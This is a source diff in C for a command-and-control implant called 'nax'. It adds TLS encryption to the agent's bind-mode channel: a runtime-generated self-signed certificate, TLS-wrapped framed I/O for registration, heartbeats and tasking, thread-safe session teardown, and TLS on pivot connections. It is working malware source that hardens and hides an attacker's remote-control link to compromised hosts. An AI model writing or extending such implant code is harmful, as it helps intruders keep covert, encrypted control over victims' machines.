@@ -23,6 +23,10 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <poll.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+#include <openssl/evp.h>
+#include <openssl/x509.h>
 
 int nax_encrypt(const uint8_t *, const uint8_t *, uint32_t, uint8_t *, uint32_t *);
 int nax_decrypt(const uint8_t *, const uint8_t *, uint32_t, uint8_t *, uint32_t *);
@@ -43,6 +47,134 @@ int nax_decode_task(const uint8_t *, uint32_t, NaxTask *);
 void nax_gather_sysinfo(NaxSysInfo *info);
 uint8_t nax_dispatch(NaxAgent *, NaxTask *, uint8_t **, uint32_t *);
 const char *nax_read_lenstr(const uint8_t *, uint32_t, uint32_t *, uint32_t *);
+
+/* ===== TLS server ===== */
+static SSL_CTX *g_bind_ssl_ctx = NULL;
+static SSL     *g_cli_ssl      = NULL;
+
+static int tls_server_init(void) {
+    if (g_bind_ssl_ctx) return 0;
+    g_bind_ssl_ctx = SSL_CTX_new(TLS_server_method());
+    if (!g_bind_ssl_ctx) return -1;
+
+    EVP_PKEY *pkey = NULL;
+    EVP_PKEY_CTX *kctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
+    if (!kctx || EVP_PKEY_keygen_init(kctx) <= 0 ||
+        EVP_PKEY_CTX_set_rsa_keygen_bits(kctx, 2048) <= 0 ||
+        EVP_PKEY_keygen(kctx, &pkey) <= 0) {
+        if (kctx) EVP_PKEY_CTX_free(kctx);
+        if (pkey) EVP_PKEY_free(pkey);
+        SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL;
+        return -1;
+    }
+    EVP_PKEY_CTX_free(kctx);
+
+    X509 *x509 = X509_new();
+    if (!x509) { EVP_PKEY_free(pkey); SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL; return -1; }
+    if (ASN1_INTEGER_set(X509_get_serialNumber(x509), 1) <= 0 ||
+        !X509_gmtime_adj(X509_get_notBefore(x509), 0) ||
+        !X509_gmtime_adj(X509_get_notAfter(x509), 365 * 24 * 3600)) {
+        X509_free(x509); EVP_PKEY_free(pkey); SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL; return -1;
+    }
+    if (X509_set_pubkey(x509, pkey) <= 0) { X509_free(x509); EVP_PKEY_free(pkey); SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL; return -1; }
+    X509_NAME *name = X509_get_subject_name(x509);
+    if (!name ||
+        X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC, (unsigned char *)"localhost", -1, -1, 0) <= 0 ||
+        X509_set_issuer_name(x509, name) <= 0) {
+        X509_free(x509); EVP_PKEY_free(pkey); SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL; return -1;
+    }
+    if (X509_sign(x509, pkey, EVP_sha256()) <= 0) { X509_free(x509); EVP_PKEY_free(pkey); SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL; return -1; }
+
+    if (SSL_CTX_use_certificate(g_bind_ssl_ctx, x509) <= 0 ||
+        SSL_CTX_use_PrivateKey(g_bind_ssl_ctx, pkey) <= 0) { X509_free(x509); EVP_PKEY_free(pkey); SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL; return -1; }
+    SSL_CTX_set_mode(g_bind_ssl_ctx, SSL_MODE_AUTO_RETRY);
+
+    X509_free(x509);
+    EVP_PKEY_free(pkey);
+    return 0;
+}
+
+static SSL *tls_accept(int sock) {
+    /* Set socket timeout to prevent blocking on incomplete handshakes.
+     * If setsockopt fails, proceed anyway — worst case is a potential
+     * block, which is the same behavior as before the timeout. */
+    struct timeval tv = { 10, 0 };
+    (void)setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    (void)setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+
+    SSL *ssl = SSL_new(g_bind_ssl_ctx);
+    if (!ssl) return NULL;
+    if (SSL_set_fd(ssl, sock) <= 0 || SSL_accept(ssl) <= 0) { SSL_free(ssl); return NULL; }
+
+    /* Clear timeouts after successful handshake */
+    tv.tv_sec = 0;
+    (void)setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    (void)setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+    return ssl;
+}
+
+/* TLS wrappers for length-prefixed I/O */
+static int tls_recv_exact_s(SSL *ssl, uint8_t *buf, uint32_t len) {
+    uint32_t got = 0;
+    int retries = 0;
+    while (got < len) {
+        int r = SSL_read(ssl, buf + got, (int)(len - got));
+        if (r > 0) { got += (uint32_t)r; retries = 0; continue; }
+        int err = SSL_get_error(ssl, r);
+        if ((err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) && ++retries < 100) {
+            usleep(1000); /* 1ms backoff to avoid busy-wait */
+            continue;
+        }
+        return -1;
+    }
+    return 0;
+}
+
+static int tls_send_exact_s(SSL *ssl, const uint8_t *buf, uint32_t len) {
+    uint32_t sent = 0;
+    int retries = 0;
+    while (sent < len) {
+        int r = SSL_write(ssl, buf + sent, (int)(len - sent));
+        if (r > 0) { sent += (uint32_t)r; retries = 0; continue; }
+        int err = SSL_get_error(ssl, r);
+        if ((err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) && ++retries < 100) {
+            usleep(1000);
+            continue;
+        }
+        return -1;
+    }
+    return 0;
+}
+
+static int tls_lp_recv(SSL *ssl, uint8_t **out, uint32_t *out_len) {
+    uint8_t hdr[4];
+    if (tls_recv_exact_s(ssl, hdr, 4) < 0) return -1;
+    uint32_t len = (uint32_t)hdr[0] | ((uint32_t)hdr[1]<<8) |
+                   ((uint32_t)hdr[2]<<16) | ((uint32_t)hdr[3]<<24);
+    if (!len || len > NAX_IO_CAP) return -1;
+    *out = malloc(len);
+    if (!*out) return -1;
+    if (tls_recv_exact_s(ssl, *out, len) < 0) { free(*out); *out = NULL; return -1; }
+    *out_len = len;
+    return 0;
+}
+
+static int tls_lp_send(SSL *ssl, const uint8_t *data, uint32_t len) {
+    uint8_t hdr[4] = { len&0xFF, (len>>8)&0xFF, (len>>16)&0xFF, (len>>24)&0xFF };
+    if (tls_send_exact_s(ssl, hdr, 4) < 0) return -1;
+    return tls_send_exact_s(ssl, data, len);
+}
+
+static int tls_send_encrypted(NaxAgent *a, SSL *ssl, uint8_t *frame, uint32_t frame_len) {
+    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK;
+    uint8_t *enc = malloc(enc_cap);
+    if (!enc) return -1;
+    uint32_t enc_len = enc_cap;
+    int rc = nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len);
+    if (rc == 0) rc = tls_lp_send(ssl, enc, enc_len);
+    free(enc);
+    return rc;
+}
 
 static void sleep_ms(uint32_t ms) {
     struct timespec ts = { ms / 1000, (long)(ms % 1000) * 1000000L };
@@ -150,14 +282,42 @@ static int lp_send(int sock, const uint8_t *data, uint32_t len) {
     return tcp_send_exact(sock, data, len);
 }
 
+/* Global C2 parent socket for tunnel results in bind mode.
+ * Protected by g_sock_mutex so reader threads can write safely.
+ * g_ssl_refcnt tracks how many threads are mid-operation on g_cli_ssl.
+ * The main thread waits for it to reach 0 before freeing SSL. */
+static int             g_tunnel_sock  = -1;
+static pthread_mutex_t g_sock_mutex   = PTHREAD_MUTEX_INITIALIZER;
+static int             g_ssl_refcnt   = 0;
+static pthread_cond_t  g_ssl_cond     = PTHREAD_COND_INITIALIZER;
+
+/* Acquire/release a reference to g_cli_ssl for thread-safe I/O.
+ * Returns the SSL* or NULL if the session is closing. */
+static SSL *ssl_ref_acquire(void) {
+    pthread_mutex_lock(&g_sock_mutex);
+    if (g_tunnel_sock < 0 || !g_cli_ssl) {
+        pthread_mutex_unlock(&g_sock_mutex);
+        return NULL;
+    }
+    g_ssl_refcnt++;
+    SSL *ssl = g_cli_ssl;
+    pthread_mutex_unlock(&g_sock_mutex);
+    return ssl;
+}
+
+static void ssl_ref_release(void) {
+    pthread_mutex_lock(&g_sock_mutex);
+    g_ssl_refcnt--;
+    if (g_ssl_refcnt <= 0) pthread_cond_signal(&g_ssl_cond);
+    pthread_mutex_unlock(&g_sock_mutex);
+}
+
 static int send_encrypted(NaxAgent *a, int sock, uint8_t *frame, uint32_t frame_len) {
-    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK;
-    uint8_t *enc = malloc(enc_cap);
-    if (!enc) return -1;
-    uint32_t enc_len = enc_cap;
-    int rc = nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len);
-    if (rc == 0) rc = lp_send(sock, enc, enc_len);
-    free(enc);
+    (void)sock;
+    SSL *ssl = ssl_ref_acquire();
+    if (!ssl) return -1;
+    int rc = tls_send_encrypted(a, ssl, frame, frame_len);
+    ssl_ref_release();
     return rc;
 }
 
@@ -208,7 +368,7 @@ static int do_register(NaxAgent *a, int sock) {
     memcpy(beat+4+16+NAX_SID_LEN, enc, enc_len);
     free(enc);
 
-    int rc = lp_send(sock, beat, beat_len);
+    int rc = tls_lp_send(g_cli_ssl, beat, beat_len);
     free(beat);
     return rc;
 }
@@ -217,19 +377,18 @@ static int do_register(NaxAgent *a, int sock) {
 extern void nax_process_tunnels(NaxAgent *a);
 extern uint32_t nax_process_tunnels_ex(NaxAgent *a, uint8_t *out, uint32_t out_cap);
 
-/* Global C2 parent socket for tunnel results in bind mode.
- * Protected by g_sock_mutex so reader threads can write safely. */
-static int             g_tunnel_sock  = -1;
-static pthread_mutex_t g_sock_mutex   = PTHREAD_MUTEX_INITIALIZER;
+
 
 /* Public wrapper used by tunnel.c — send STATUS_TUNNEL frame in bind mode */
 
 
 static int do_heartbeat(NaxAgent *a, int sock) {
+    (void)sock;
     uint8_t  frame[NAX_FRAME_HDR + 64];
     uint32_t frame_len = sizeof(frame);
     if (nax_build_heartbeat(frame, &frame_len) < 0) return -1;
-    return send_encrypted(a, sock, frame, frame_len);
+    if (!g_cli_ssl) return -1;
+    return tls_send_encrypted(a, g_cli_ssl, frame, frame_len);
 }
 
 /* ===== process_pivots_bind =============================================
@@ -253,7 +412,7 @@ static void process_pivots_bind(NaxAgent *a, int parent_sock)
             uint8_t lenbuf[4];
             ssize_t got = 0;
             while (got < 4) {
-                ssize_t r = recv(p->sock, lenbuf + got, 4 - got, 0);
+                ssize_t r = p->ssl ? SSL_read((SSL*)p->ssl, lenbuf + got, 4 - got) : recv(p->sock, lenbuf + got, 4 - got, 0);
                 if (r <= 0) { broken = 1; break; }
                 got += r;
             }
@@ -267,7 +426,7 @@ static void process_pivots_bind(NaxAgent *a, int parent_sock)
             if (!msg) { broken = 1; break; }
             got = 0;
             while ((uint32_t)got < msg_len) {
-                ssize_t r = recv(p->sock, msg + got, msg_len - (uint32_t)got, 0);
+                ssize_t r = p->ssl ? SSL_read((SSL*)p->ssl, msg + got, (int)(msg_len - (uint32_t)got)) : recv(p->sock, msg + got, msg_len - (uint32_t)got, 0);
                 if (r <= 0) { free(msg); broken = 1; break; }
                 got += r;
             }
@@ -315,6 +474,7 @@ static void process_pivots_bind(NaxAgent *a, int parent_sock)
                 }
                 free(res_frame);
             }
+            if (p->ssl) { SSL_shutdown((SSL*)p->ssl); SSL_free((SSL*)p->ssl); }
             close(p->sock);
             *pp = p->next;
             free(p);
@@ -417,6 +577,8 @@ void nax_tcp_bind_main(NaxAgent *a) {
     a->running = true;
     DBG("bind mode starting: port=%d wm=0x%08x", a->cfg.bind_port, a->cfg.wm);
 
+    if (tls_server_init() < 0) { DBG_ERR("TLS server init failed"); return; }
+
     int srv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (srv < 0) return;
 
@@ -440,10 +602,13 @@ void nax_tcp_bind_main(NaxAgent *a) {
     while (a->running) {
         int cli = accept(srv, NULL, NULL);
         if (cli < 0) { if (errno==EINTR) continue; break; }
-        DBG("parent connected");
+        DBG("parent connected — TLS handshake");
+        g_cli_ssl = tls_accept(cli);
+        if (!g_cli_ssl) { DBG_ERR("TLS accept failed"); close(cli); continue; }
+        DBG("TLS established");
 
         DBG("sending REGISTER beat");
-        if (do_register(a, cli) < 0) { DBG("REGISTER failed"); close(cli); continue; }
+        if (do_register(a, cli) < 0) { DBG("REGISTER failed"); SSL_shutdown(g_cli_ssl); SSL_free(g_cli_ssl); g_cli_ssl = NULL; close(cli); continue; }
         DBG("REGISTER sent OK");
 
         /* Set global parent socket for tunnel reader threads */
@@ -579,7 +744,7 @@ void nax_tcp_bind_main(NaxAgent *a) {
             if (pfd.revents & POLLIN) {
                 uint8_t *raw     = NULL;
                 uint32_t raw_len = 0;
-                if (lp_recv(cli, &raw, &raw_len) < 0) { DBG("lp_recv failed"); break; }
+                if (tls_lp_recv(g_cli_ssl, &raw, &raw_len) < 0) { DBG("tls_lp_recv failed"); break; }
                 DBG("received %u bytes from parent", raw_len);
                 int rc = handle_parent_data(a, cli, raw, raw_len);
                 free(raw);
@@ -587,13 +752,20 @@ void nax_tcp_bind_main(NaxAgent *a) {
             }
         }
 
-        /* Clear global socket so reader threads stop sending */
+        /* Tear down: prevent new I/O, wait for in-flight ops, then free TLS.
+         * 1. Set g_tunnel_sock = -1 → ssl_ref_acquire() returns NULL
+         * 2. Wait until g_ssl_refcnt == 0 → all in-flight ops done
+         * 3. Free SSL — guaranteed no thread is using it */
         pthread_mutex_lock(&g_sock_mutex);
         g_tunnel_sock = -1;
+        while (g_ssl_refcnt > 0)
+            pthread_cond_wait(&g_ssl_cond, &g_sock_mutex);
         pthread_mutex_unlock(&g_sock_mutex);
+        if (g_cli_ssl) { SSL_shutdown(g_cli_ssl); SSL_free(g_cli_ssl); g_cli_ssl = NULL; }
         close(cli);
         gen_session_id(a->session_id);
     }
 
     close(srv);
+    if (g_bind_ssl_ctx) { SSL_CTX_free(g_bind_ssl_ctx); g_bind_ssl_ctx = NULL; }
 }
